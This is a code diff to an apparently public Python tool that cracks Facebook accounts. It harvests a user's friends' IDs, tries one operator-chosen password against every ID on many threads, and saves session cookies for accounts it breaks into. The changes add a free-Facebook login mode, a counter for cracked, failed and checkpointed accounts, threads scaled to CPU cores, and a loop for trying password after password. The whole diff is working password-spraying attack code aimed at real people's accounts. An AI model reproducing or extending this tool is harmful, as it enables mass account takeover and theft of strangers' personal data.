@@ -7,6 +7,7 @@ import marshal
 import re
 import sys
 import os
+from multiprocessing import cpu_count , Process
 from multiprocessing.pool import ThreadPool 
 os.system("clear")
 
@@ -24,6 +25,21 @@ rball = u'\U0001f534'
 tick = u'\u2705'
 barem = '\xe2\x97\xbb'
 
+OS_NAME = sys.platform.upper()
+CPU_CORES = cpu_count()
+MAX_THREADS = CPU_CORES*10
+
+'''
+global crack_sucess
+global crack_fail
+global crack_checkpoint
+global crack_total
+'''
+crack_sucess = 0
+crack_checkpoint = 0
+crack_fail = 0
+crack_total = 0
+
 
 banner = f'''{Y}
  {W}[{R}!{W}] {R}Developer Takes No Responsibility of this Script {Y}
@@ -32,10 +48,14 @@ banner = f'''{Y}
  / __ \ \__/ / __ \   {W}UPDATED VERSION {R}(FIX){Y}
 / /  \ \____/ /  \ \   {W}    BY {Y}
 \ \__/ / __ \ \__/ /   {W} NASIR ALI{Y}
- \____/ /  \ \____/
-
+ \____/ /  \ \____/      {G}V {Y}1.1
+ 
 {Y} Github : {G}https://{W}github.com/nasirxo/flb2
 {Y} Facebook : {G}https://{W}fb.com/nasir.xo
+
+   {W}[{G}!{W}] OPERATING SYSTEM : {G}{OS_NAME}
+   {W}[{G}!{W}] CPU CORES : {G}{CPU_CORES}
+   {W}[{G}!{W}] MAX THREADS : {G}{MAX_THREADS}
 
 '''
 
@@ -1354,11 +1374,14 @@ class FB:
 
    def set_url(self,url):
       self.url = str(url) 
-  
+   
+   def free_facebook_mode(self):
+       self.url = "https://free.facebook.com/{}"
+   
    def prepare(self):
       self.login_var = {}
-      login_page = self.s.get(self.url.format('/'))
-      login_form = bs(login_page.content,"html.parser").find("form")
+      login_page = self.s.get(self.url.format('/?refid=9'))
+      login_form = bs(login_page.text,"html.parser").find("form")
       self.act_url = self.url.format(login_form.get("action"))
       for Z in login_form.findAll("input",{"type":"hidden"}):
           self.login_var[Z.get("name")] = Z.get("value")
@@ -1536,12 +1559,36 @@ class FB:
 
 
 
+class CRACK_COUNTER:
+   def __init__(self,S=0,F=0,C=0,T=0):
+       self.S = S
+       self.F = F
+       self.C = C
+       self.T = T
+       
+   def sucess(self,n=None):     
+       if n==None: self.S+=1
+       else: self.S = n
+        
+   def fail(self,n=None):       
+        if n==None: self.F+=1
+        else: self.F = n
+        
+   def checkpoint(self,n=None): 
+        if n==None: self.C+=1
+        else: self.C = n
 
+   def progress(self):
+      try:
+       return round(((self.S+self.F+self.C)/self.T)*100.0,2)
+      except:
+       return 0.00
 
-
+C_C = CRACK_COUNTER()
 
 def crack(email_pass):
-  try:
+ print(f"{W} [{G}*{W}] CRACK STATUS - {W}({R}{C_C.F}{W}){W} ({G}{C_C.S}{W}){W} ({Y}{C_C.C}{W}) -> {G}{C_C.progress()}%",end="\r")
+ try:
    email,password = email_pass.split("::")
    #print(email,password)
    Q = FB()
@@ -1550,25 +1597,40 @@ def crack(email_pass):
    Q_RES = Q.login(NEW=True)
    if len(Q.getaccountid()) > 2:
       print(f" {G}[+]{W} {email} {G}|{W} {password} ")
+      C_C.sucess()
       Q.savecookie(f"{email}.cookie")
+      
    if "checkpoint" in Q_RES.url:
+      C_C.checkpoint()
       RES_ATTR = Q_RES.url.replace(Q.url.format("/"),"")
-      print(f" {G}[+]{W} {email} {G}|{W} {password} -> {Y}{RES_ATTR}") 
-  except: pass
+      print(f" {G}[+]{W} {email} {G}|{W} {password} -> {Y}{RES_ATTR}")
+      
+   if len(Q.getaccountid()) < 2 and "checkpoint" not in Q_RES.url:
+      C_C.fail()
+      print(C_C.F,end="\r")
+      
+ except: C_C.fail()
 
 
 
 
 
-
-
+#MAX THREAD INITIALIZE
+TP = ThreadPool(MAX_THREADS)
 
    
 if __name__ == '__main__':
-   print(banner)
    f = FB()
+   FTEXT = ""
+   FB_MODE = input(f" {W}[{R}!{W}]{Y} WANT TO USE FREE FACEBOOK MODE ? {W}({G}Y{W}/{R}N{W}) : {Y}") 
+   if FB_MODE.upper() == "Y":
+      f.free_facebook_mode()
+      FTEXT = "FREE FACEBOOK MODE"
+   os.system("clear") 
+   print(banner)
    if os.path.exists("cookie") == False: 
      print(f"""
+         {G} {FTEXT}
        {W}=== (LOGIN OPTIONS) ===
         {G}[1] LOGIN VIA EMAIL/PASS
         {G}[2] LOGIN VIA COOKIE (RECOMENDED)
@@ -1601,6 +1663,7 @@ if __name__ == '__main__':
      
    if os.path.exists("cookie") == True:
      print(f"""
+           {G} {FTEXT}
        {W}====== (COOKIE FOUND) =======
         {G}[1] LOGIN WITH CURRENT COOKIE
         {G}[2] LOGIN VIA CUSTOM COOKIE
@@ -1644,25 +1707,28 @@ if __name__ == '__main__':
    if os.path.exists(f"{a_id}.ids") == False: 
        f.getfriends()
        f.save_friend_ids(f"{a_id}.ids")
-   
-   TRY_PASS =  input(f"{W} [-] PASSWORD TO TRY : {Y}")
-   CRACK_LIST = []
-   print(f"{G} [+] MAKING IDS/PASSWORD COMBINATION ...")
-   for W_L in f.friends_ids.keys():
-     #time.sleep(0.001)
-     try:
-       crack_text = f"{f.friends_ids[W_L]['id']}::{TRY_PASS}"
-       print(f"{Y} [*] Adding - {W}({f.friends_ids[W_L]['id']})",end="\r")
-       CRACK_LIST.append(crack_text)
-     except: pass
+   while True:
+     C_C.S = 0
+     C_C.F = 0
+     C_C.C = 0
+     C_C.T = len(f.friends_ids.keys())
+     TRY_PASS =  input(f"{W} [-] PASSWORD TO TRY : {Y}")
+     CRACK_LIST = []
+     print(f"{G} [+] MAKING IDS/PASSWORD COMBINATION ...")
+     for W_L in f.friends_ids.keys():
+       #time.sleep(0.001)
+       try:
+         crack_text = f"{f.friends_ids[W_L]['id']}::{TRY_PASS}"
+         print(f"{Y} [*] Adding - {W}({f.friends_ids[W_L]['id']})",end="\r")
+         CRACK_LIST.append(crack_text)
+       except: pass
      
-   print(f"{G} [+] CRACKING IN MULTITHREAD MODE ...")
-   print(f"{G} [!] {Y}INFO : {W}if any account is cracked it will be shown below so be patient")
-   print(f"\n\n{W} ===========({G}CRACKING{W})=============")
-   TP = ThreadPool(50)
-   TP.map(crack,CRACK_LIST)
-      
-   #f.getfriends()
-   #f.save_friend_ids("friends.ids")
+     print(f"{G} [+] CRACKING IN MULTITHREAD MODE ...")
+     print(f"{G} [!] {Y}INFO : {W}if any account is cracked it will be shown below so be patient")
+     print(f"\n\n{W} ===========({G}CRACKING{W})=============")
+     TP.map(crack,CRACK_LIST)
+     print(f"\n\n{W} ===========({G}FINISHED{W})=============\n\n")
+     #f.getfriends()
+     #f.save_friend_ids("friends.ids")
    
    
